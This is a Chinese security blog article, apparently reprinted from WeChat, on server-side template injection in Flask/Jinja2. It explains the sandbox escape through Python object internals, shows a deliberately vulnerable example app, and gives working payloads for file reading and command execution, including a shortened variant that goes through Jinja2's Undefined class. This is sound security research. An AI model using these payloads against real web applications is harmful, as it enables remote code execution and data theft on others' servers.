2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
关于Flask SSTI，解锁你不知道的新姿势
原创 队员编号031 酒仙桥六号部队 7⽉3⽇
这是 酒仙桥六号部队 的第 31 篇⽂章。
全⽂共计2388个字，预计阅读时⻓8分钟。
前⾔
本⽂主要介绍笔者在学习Flask SSTI相关知识时，⽆意中解锁了新姿势。在研究原理
后，从中挖掘出新的奇怪知识点~
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 1/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
前置知识
Flask和SSTI介绍
Flask 是 ⼀ 个 使 ⽤ Python 编 写 的 轻 量 级 Web 应 ⽤ 框 架 。 其 WSGI ⼯ 具 箱 采 ⽤
Werkzeug，模板引擎则使⽤Jinja2。
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 2/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
SSTI(Server-Side Template Injection)，即服务端模板注⼊攻击。通过与服务端
模板的输⼊输出交互，在过滤不严格的情况下，构造恶意输⼊数据，从⽽达到读取⽂件
或者getshell的⽬的。
jinja2 语法
在jinja2中，存在三种语法：
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 3/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
1 控制结构 {% %}
2 变量取值 {{ }}
3 注释 {# #}
jinja2模板中使⽤{{ }}语法表示⼀个变量，它是⼀种特殊的占位符。当利⽤jinja2进⾏
渲染的时候，它会把这些特殊的占位符进⾏填充/替换，jinja2⽀持Python中所有的
Python数据类型⽐如列表、字段、对象等。jinja2中的过滤器可以理解为是jinja2⾥⾯
的内置函数和字符串处理函数。被两个括号包裹的内容会输出其表达式的值。
沙箱绕过
jinja2的Python模板解释器在构建的时候考虑到了安全问题，删除了⼤部分敏感函数，
相当于构建了⼀个沙箱环境。但是⼀些内置函数和属性还是依然可以使⽤，⽽Flask的
SSTI就是利⽤这些内置函数和属性相互组建来达到调⽤函数的⽬的，从⽽绕过沙箱。
函数和属性解析:
1 __class__ 返回调⽤的参数类型
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 4/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
2 __bases__ 返回基类列表
3 __mro__ 此属性是在⽅法解析期间寻找基类时的参考类元组
4 __subclasses__() 返回⼦类的列表
5 __globals__ 以字典的形式返回函数所在的全局命名空间所定义的全局变量 与 func_gl
6 __builtins__ 内建模块的引⽤，在任何地⽅都是可⻅的(包括全局)，每个 Python 脚本都
获取 object 类:
1 ''.__class__.__mro__[2] # 在 python2 中字符串在考虑解析时会有三个参考类 str
2 ''.__class__.__mro__[1] # 在 python3 中字符串在考虑解析时会有两个参考类 str
3 {}.__class__.__bases__[0]
4 ().__class__.__bases__[0]
5 [].__class__.__bases__[0]
原理解读
简单尝试
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 5/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
先来看下⼀个简单的Flask SSTI的实例：
1 from flask import Flask, request
2 from jinja2 import Template
3
4 app = Flask(__name__)
5
6 @app.route("/")
7 def index():
8 name = request.args.get('name', 'guest')
9 t = Template("Hello " + name) # 创建模板
10 return t.render() # 渲染
11
12 if __name__ == "__main__":
13 app.run(); # 启动 flask ，默认 5000 端⼝
代码很简单，就是访问主⻚的时候name参数会被渲染到⻚⾯。
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 6/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
可以看出来到这⾥有个反射型XSS，的确如此XSS就是这个位置有可能有SSTI的前奏。
name参数后边也可以输⼊表达式之类的，例如:
1 name={{2*2}}
1 name={{'abc'.upper()}}
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 7/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
可以看到取表达式的值是可以成功的。但是⼀旦直接调⽤普通函数就会报错：
1 name={{abs(-1)}}
后台显示abs未定义：
绕过沙箱
我们来尝试获取 "()" 的类型：
1 name={{().__class__.__name__}}
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 8/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
成功获取"()"的类型tuple（元组）。我们知道Python中所有类型的其实都是object类
型，所以下⾯我们继续尝试：
获取到object类型：
1 name={{().__class__.__base__.__name__}}
获取到object的所有⼦类：
1 name={{''.__class__.__mro__[1].__subclasses__().__name__}}
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 9/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
发现⼦类型有很多，在这⾥我们需要找到内建模块中含有eval或者open的类型来使我们
可以执⾏代码或读取⽂件。查找脚本如下：
1 code = 'eval' # 查找包含 eval 函数的内建模块的类型
2 i = 0
3 for c in ().__class__.__base__.__subclasses__():
4 if hasattr(c,'__init__') and hasattr(c.__init__,'__globals__') and c
5 print('{} {}'.format(i,c))
6 i = i + 1
运⾏结果：
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 10/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
在Python 2/3版本中有这么多类型的内建模块中都包含eval。这⾥为了让最后的结果
同时兼容Python 2/3版本我们使⽤索引为77的类型：class 'site.Quitter'。
我们看看在这个class 'site.Quitter'的global环境下都可以执⾏那些函数：
1 name={{().__class__.__base__.__subclasses__()[77].__init__.__globals__['_
可以看到⼏个敏感函数eval、open、file等等，应有尽有。这样我们就可以做很多我们
想做的事了。
执⾏代码abs(-1):
1 name={{().__class__.__base__.__subclasses__()[77].__init__.__globals__['_
看到abs(-1)已经执⾏成功，⾄此我们已经成功绕过了沙箱，执⾏了本不可执⾏的代
码。
常⽤可兼容Python 2/3版本的Payload：
读取⽂件：
1 {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__buil
命令执⾏：
1 {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__buil
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 11/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
是不是觉得这些Payload有些⻓了呢？那么有没有什么办法可以缩减⼀些⻓度呢？
解锁新姿势
⽆意中的尝试
当我在编写脚本和将Payload输⼊浏览器的时候，因⼿误⽆意中组成了⼀个错误的
Payload：
1 name={{().__class__.__base__.__subclasses__().c.__init__.__globals__['__b
执⾏结果：
竟然访问成功了！
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 12/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
那么为什么会访问成功呢？
().class.base.subclasses()理应返回的是object类型的所有⼦类的列表，是不应该
包含c这个属性的。
理论上应该造成服务端错误返回500，服务器⽇志显示AttributeError: 'list' object
has no attribute 'c'。但是结果却是成功执⾏了，这让我意识到jinja2的沙箱环境，
跟普通Python运⾏环境还是有很多不同的。
既然这样的话我们就看下这个c对象的init函数到底是个啥？
1 name={{().__class__.__base__.__subclasses__().c.__init__}}
执⾏结果：
竟然是⼀个Undefined类型，也就是说如果碰到未定义的变量就会返回为Undefined类
型。⽽Python官⽅库是没有这个类型的，也就是说明这个Undefined是jinja2框架提
供的。我们在jinja2框架的源码中搜寻，最后在runtime.py中找到了Undefined这个
class：
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 13/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
继承的是object类型，并且还有其他函数。为了确认是这个class ，我们尝试使⽤
_fail_with_undefined_error：
1 name={{().__class__.__base__.__subclasses__().c._fail_with_undefined_erro
OK，确认过眼神，我遇⻅对的class!
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 14/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
既然都是Undefined那我随便定义⼀个未被定义过的变量也应该是Undefined：
1 name={{a.__init__.__globals__.__builtins__}}
既然Undefined类可以执⾏成功，那我们就可以看看他的全局global的内建模块中都包
含什么了：
1 name={{a.__init__.__globals__.__builtins__}}
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 15/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
⽼样⼦，还是可以看到⼏个敏感函数eval、open等等，应有尽有。
优化 Payload
对此我们直接优化我们的Payload，使⻓度⼤⼤缩短，可读性也变强了。
优化后的兼容 Python 2/3 版本的 Payload：
读取⽂件：
1 {{a.__init__.__globals__.__builtins__.open("C:\Windows\win.ini").read()}}
命令执⾏：
1 {{a.__init__.__globals__.__builtins__.eval("__import__('os').popen('whoam
最后
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 16/17
2020/7/27 关于Flask SSTI，解锁你不知道的新姿势
https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA 17/17